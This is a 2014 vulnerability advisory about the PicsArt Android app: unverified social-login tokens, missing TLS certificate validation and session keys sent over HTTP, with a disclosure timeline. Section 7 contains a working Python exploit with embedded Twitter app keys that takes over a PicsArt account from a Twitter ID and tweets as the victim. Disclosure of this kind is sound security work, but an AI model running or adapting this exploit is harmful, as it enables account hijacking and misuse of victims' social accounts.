@@ -1,0 +1,198 @@
+Fundación Dr. Manuel Sadosky - Programa STIC Advisory
+www.fundacionsadosky.org.ar
+
+Insecure management of login credentials in Picsart application
+
+
+1. *Advisory Information*
+
+Title: Insecure management of login credentials in Picsart application
+Advisory ID: STIC-2014-0426
+Advisory URL: http://www.fundacionsadosky.org.ar/publicaciones-2
+Date published: 2014-10-13
+Date of last update: 2014-07-28
+Vendors contacted: PicsArt
+Release mode: Unilateral release
+
+
+2. *Vulnerability Information*
+
+Class: Authentication issues [CWE-287]
+Impact: Data loss
+Remotely Exploitable: Yes
+Locally Exploitable: Yes
+CVE Identifier: CVE-NOCVE-2014-XXXXX
+
+
+3. *Vulnerability Description*
+ 
+      PicsArt Photo Studio is a free and full featured photo-editing and drawing mobile app available on Android, iOS and Windows Phone. As of May 2nd, 2014 the Android version of the app had between 100 and 500 million downloads from the Google Play store. According to the vendor the app has been installed more than 140 million times, has a 7 million monthly growth and more than 18 million registered users[1]. Users can take, edit, publish and share photos on the PicsArt website and on popular social networks such as Facebook, Twitter and Google+ directly from the mobile app.
+     
+      PicsArt server doesn't verify if the user's Google+, Facebook or Twitter's access token are valid during the login of the Android application[2]. As a result, an attacker can send a login request providing only a social network ID and obtain the PicsArt's credentials associated to that Google+/Facebook/Twitter user. This allows the attacker to obtain access to any user account created from a social network account. 
+           
+      Furthermore, PicsArt application recently started using HTTPS but the certificate validation is missing allowing an attacker to perform Man-In-The-Middle attacks. Some of the application requests also are still obtained via HTTP. Sessions can also be hijacked by capturing the user key used embedded in the URL of some of this requests.
+           
+      As a result, an attacker can also steal real user's access tokens of any of the other social accounts mentioned linked to the user's PicsArt profile by requesting information about the user's profile to the server. They can then use this access tokens to steal personal information stored in these third party sites or even upload content. 
+     
+      This issue affects all PicsArt user's who access their account via Google+/Facebook/Twitter.
+    
+
+4. *Vulnerable packages*
+
+   . PicsArt Android application older or equal to version 4.6.12
+
+5. *Vendor Information, Solutions and Workarounds*
+
+      After the initial report to the vendor, PicsArt released version 4.2.2. This version started using HTTPS for most of the API. Since 4.6.3 there are no API methods that leak the user's session key using HTTP. Adding HTTPS communication to the server in 4.2.2 didn't help fixing the problem since the application lacks of certificate validation allowing Man-in-the-Middle attacks. Despite of the researcher reports sent to PicsArt, last version 4.6.12 is still missing the certificate validation process. 
+    
+        The server is still missing the validation of the login access token.
+     
+        A workaround to prevent attackers from compromising a user Facebook, Twitter or Google+ account is to disable PicsArt application access to their profile. From Facebook or Twitter go to "Settings|App" and remove PicsArt application from the list of apps. For Google+ go to "Account|Security|Apps and websites" and click on revoke access on PicsArt application.
+     
+
+6. *Credits*
+
+This vulnerability was discovered and researched by Joaquín Manuel Rinaudo. The publication of this advisory was coordinated by Programa Seguridad en TIC. 
+
+7. *Technical Description*
+
+      A user can sign up to PicsArt using her Facebook, Twitter or Google+ account or using a standard email and password scheme.
+      When a user signs using a social network, the PicsArt application uses the Oauth protocol to communicate to that site. If the user confirms the access, the PicsArt application is provided with an access token from either Facebook, Twitter or Google+ that can be used to retrieve some user's personal information or perform some actions in behalf of that user.
+     
+      PicsArt application then uploads the access token to the server along with the ID of that user so that the server can create a new account associated to that user. Up to PicsArt version 4.2.2, this communication was entirely using HTTP. An attacker capturing the request for 'https://api.picsart.com/users/signin.json' could retrieve the access token of Facebook, Twittter and Google+ as well as hijack the session token of PicsArt for that user.
+      
+      HTTPS was recently included by PicsArt team to prevent from Man-in-the-middle attacks as well as session hijacking. The socket used to perform the secure connection uses a custom X509TrustManager. The TrustManager's task is to check the certificate presented by the server in order to prevent Man-in-the-Middle attacks. The class 'com.socialin.android.util.w' sets the default SSLSocketFactory used in the application to an empty TrustManager and the default HostnameVerifier to a dummy one. Because of that, all presented certificates will be valid ones. This allows attacker to mount a MITM attack intercepting traffic via ARP-spoofing and creating fake X509 certificates and submitting them to PicsArt's Android application. 
+      
+      Moreover, some requests performed by the application are still obtained using HTTP. For example, when a user opens the application, a request over HTTP to 'https://api.picsart.com/users/show/me.json' to obtain user information. Since requests that contains the user key as a parameter like this are being sent to the server, session hijacking is possible by simply capturing traffic. This was fix in the version 4.6.3.
+      
+      Like it was said before, when a user logs in with a social network account using the Android's PicsArt application, an HTTP post request is made to PicsArt's servers which contains the user's access token and other information such as his name, user name, mail and a user identifier for the social network. The server doesn't verify if the access token provided is valid for an already created account and responds with the user's key associated with the user's social network ID provided. This allows an attacker to obtain access to other user's accounts by just knowing the user name from their social network.
+    
+      An attacker can also obtain the user's access tokens of networks linked their profile by requesting the user's profile information using the key provided by the previous step. For example, if a user's has his Twitter account linked to his PicsArt account, the server's response to the profile information will contain user's OAUTH_TOKEN and OAUTH_TOKEN_SECRET. Because the Android's PicsArt application contains the APP_KEY and APP_SECRET embedded in their code, an attacker has all the information needed to access the user's Twitter profile. Since the application has read and write permissions in that social network, an attacker could perform status updates.
+    
+      An exploit that allows to steal user's keys from PicsArt, get user's keys from twitter and tweet with his account with only the Twitter ID for that user is as follows:
+    
+
+
+/-----
+import sys
+import urllib
+import urllib2
+from twython import Twython
+import json
+import traceback
+
+APP_KEY='N3aQqOLTNqrDcwTRTmUBOg'
+APP_SECRET='VSLR3p6DYYxS5l7LvAQmTfCtmDLfHwBUveKSbH9Bw'
+OAUTH_TOKEN=''
+OAUTH_TOKEN_SECRET=''
+
+def obtain_key(twitter_id):
+  url = 'https://api.picsart.com/users/signin.json'
+  only_twitter_id = '''{"id":"%s","token_secret":"","profile_url":"","screen_name":"","token":"","name":""}''' %twitter_id
+  data = 'token=&auth='+ urllib.quote(only_twitter_id)+'&provider=twitter'
+  req = urllib2.Request(url, data)
+  response = urllib2.urlopen(req)
+  jsonobject = json.loads(response.read())
+  return jsonobject['key']
+
+def obtain_twitter_token(key):
+  url = '''https://api.picsart.com/connections/show/me.json?key=%s''' %key
+  response = urllib2.urlopen(url)
+  data = json.loads(response.read())
+  print data
+  global OAUTH_TOKEN  
+  OAUTH_TOKEN = data['response'][0]['token']
+  global OAUTH_TOKEN_SECRET  
+  OAUTH_TOKEN_SECRET = data['response'][0]['data']['token_secret']
+
+def post_on_twitter():
+  twitter = Twython(APP_KEY, APP_SECRET,OAUTH_TOKEN, OAUTH_TOKEN_SECRET)
+  print twitter.verify_credentials()
+  twitter.update_status(status='Using twitter!')
+
+if __name__ == '__main__':
+  if len(sys.argv) < 1: 
+    print "No Twitter ID specified"
+    exit(0) 
+  userKey =obtain_key(sys.argv[1])
+  print "User key for accessing user's Picsart account is %s" %userKey
+  try:
+    obtain_twitter_token(userKey) 
+    post_on_twitter()
+  except:
+    traceback.print_exc()
+    print "Failed accessing user's Twitter account"
+    pass
+
+
+-----/
+
+
+8. *Report Timeline*
+
+. 2014-05-05:
+Programa Seguridad en TIC sent the vendor a description of the vulnerabilities found: the improper server validation of access tokens and the use of unencrypted HTTP communication with the server. 
+        
+
+. 2014-05-07:
+
+          PicsArt indicated that the problems where already known and that due to previous technical problems the application had switched temporary to HTTP but that the new release, 4.2.2, HTTPS would be back.
+        
+
+. 2014-05-07:
+
+          The researcher communicated to PicsArt about having inspected the updated app and that although the communication was HTTPS, certificate validation was missing. Furthermore, Programa Seguridad en TIC communicated the vendor that the improper validation of the login process was still an issue. The vendor was informed about  a tentative date for May 21st set for publishing the advisory.
+        
+
+. 2014-06-05:
+
+          After receiving no response, Programa Seguridad en TIC asked for PicsArt about plans to fixing the issues discussed.
+        
+
+. 2014-06-05:
+
+          PicsArt notified that they were releasing a version into beta with fixed security and other features but with no explanation as to what was being fixed.
+      
+
+. 2014-09-11:
+Programa Seguridad en TIC added the Computer Emergency Response Team to the conversation since they had also identified and notified PicsArt of the insecure communication in their research project [3]. 
+      
+
+. 2014-09-11:
+
+         Vendor assured that a new released was being deployed where the user's key was not being transmitted over HTTP in version 4.6.3 and that they were testing new bug fixes.
+      
+
+. 2014-09-16:
+Programa Seguridad en TIC asked for an estimated release of the application and informed to the vendor that the application was using an external library to implement their API ([4]) and this was one of the sources for the problem of not validating the certificates properly since they where intentionally calling some library methods for skipping the validation process. 
+      
+
+. 2014-09-17:
+
+         Vendor sent the researcher a new beta version where the external library wasn't instructed to avoid validating certificates.
+      
+
+. 2014-09-18:
+Programa Seguridad en TIC notified that the server validation and the HTTPS vulnerabilities where still unfixed. The later was because the application was still defining the default SSLSocketFactory and HostnameVerifier in an insecure way. Researcher pointed the vendor to the class originating this definitions.
+      
+
+. 2014-10-13:
+
+         Advisory was released.
+      
+
+
+9. *References*
+
+[1] http://picsart.com/about
+[2] https://play.google.com/store/apps/details?id=com.picsart.studio
+[3] http://www.kb.cert.org/vuls/id/582497
+[4] https://github.com/kevinsawicki/http-request
+
+10. *About Fundación Dr. Manuel Sadosky*
+
+The Dr. Manuel Sadosky Foundation is a mixed (public / private) institution whose goal is to promote stronger and closer interaction between industry and the scientific-technological system in all aspects related to Information and Communications Technology (ICT). The Foundation was formally created by a Presidential Decree in 2009. Its Chairman is the Minister of Science, Technology, and Productive Innovation of Argentina; and the Vice-chairmen are the chairmen of the country’s most important ICT chambers: The Software and Computer Services Chamber (CESSI) and the Argentine Computing and Telecommunications Chamber (CICOMRA). For more information visit: https://www.fundacionsadosky.org.ar
+
+11. *Copyright Notice*
+
+The contents of this advisory are copyright (c) 2014 Fundación Sadosky and are licensed under a Creative Commons Attribution Non-Commercial Share-Alike 4.0 License: http://creativecommons.org/licenses/by-nc-sa/4.0/
